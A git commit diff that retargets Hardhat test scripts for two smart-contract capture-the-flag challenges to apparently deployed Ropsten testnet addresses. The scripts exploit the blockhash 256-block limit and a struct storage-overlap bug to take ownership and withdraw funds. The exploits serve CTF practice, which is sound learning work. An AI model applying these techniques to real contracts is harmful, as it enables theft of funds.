417563ba20701b0c9d99a6e5c8e47fbc4bf019e5
krouspy <knjlau1@gmail.com>
2022-01-14 13:12:18 +0100

    target ropsten

--- test/lotteries/predict-block-hash.test.ts
+++ test/lotteries/predict-block-hash.test.ts
@@ -4,24 +4,27 @@ import { etherToWei, mineBlocks } from '../utils';
 
 describe('PredictBlockHash', function () {
   it('should guess the block hash', async function () {
-    const Challenge = await ethers.getContractFactory('PredictTheBlockHash');
-    const challenge = await Challenge.deploy({ value: etherToWei(1) });
-    await challenge.deployed();
+    const challengeAddress = '0x479bc2dF0884113fD346d6Cecb39F2ba432d6BfB';
 
-    const answer =
-      '0x0000000000000000000000000000000000000000000000000000000000000000';
-    const lockIsGuessTx = await challenge.lockInGuess(answer, {
-      value: etherToWei(1),
-    });
-    await lockIsGuessTx.wait();
+    const Challenge = await ethers.getContractFactory('PredictTheBlockHash');
+    const challenge = Challenge.attach(challengeAddress);
+
+    // const answer =
+    //   '0x0000000000000000000000000000000000000000000000000000000000000000';
+    // const lockIsGuessTx = await challenge.lockInGuess(answer, {
+    //   value: etherToWei(1),
+    // });
+    // await lockIsGuessTx.wait();
 
     /**
      * blockhash() only works for the 256 most recent blocks and will return 0x0000000000000000000000000000000000000000000000000000000000000000
      * for older blocks so we mine 257 blocks so that it will match our guess
+     * If you are using a local testnet like hardhat, you can mine blocks by making simple transaction
      */
-    const blocksToMine = 257;
-    await mineBlocks(blocksToMine);
+    // const blocksToMine = 257;
+    // await mineBlocks(blocksToMine);
 
+    console.log('settle');
     await challenge.settle();
     expect(await challenge.isComplete()).to.be.true;
   });
--- test/math/donation.test.ts
+++ test/math/donation.test.ts
@@ -1,25 +1,21 @@
 import { expect } from 'chai';
 import { ethers } from 'hardhat';
-import { etherToWei } from '../utils';
 
 describe('Donation', function () {
   it('should exploit how Struct uses storage', async function () {
-    const [_, player] = await ethers.getSigners();
-
+    const challengeAddress = '0xC7982B53bc0d8466788069f56E2389a1D9cf0827';
     const Challenge = await ethers.getContractFactory('DonationChallenge');
-    const challenge = await Challenge.deploy({ value: etherToWei(1) });
-    await challenge.deployed();
+    const challenge = Challenge.attach(challengeAddress);
 
+    const [player] = await ethers.getSigners();
     const amountToDonate = ethers.BigNumber.from(player.address);
     const scale = ethers.BigNumber.from(10).pow(36);
     const fee = amountToDonate.div(scale);
 
-    let tx = await challenge
-      .connect(player)
-      .donate(amountToDonate, { value: fee });
+    let tx = await challenge.donate(amountToDonate, { value: fee });
     await tx.wait();
 
-    tx = await challenge.connect(player).withdraw();
+    tx = await challenge.withdraw();
     await tx.wait();
 
     expect(await challenge.isComplete()).to.be.true;
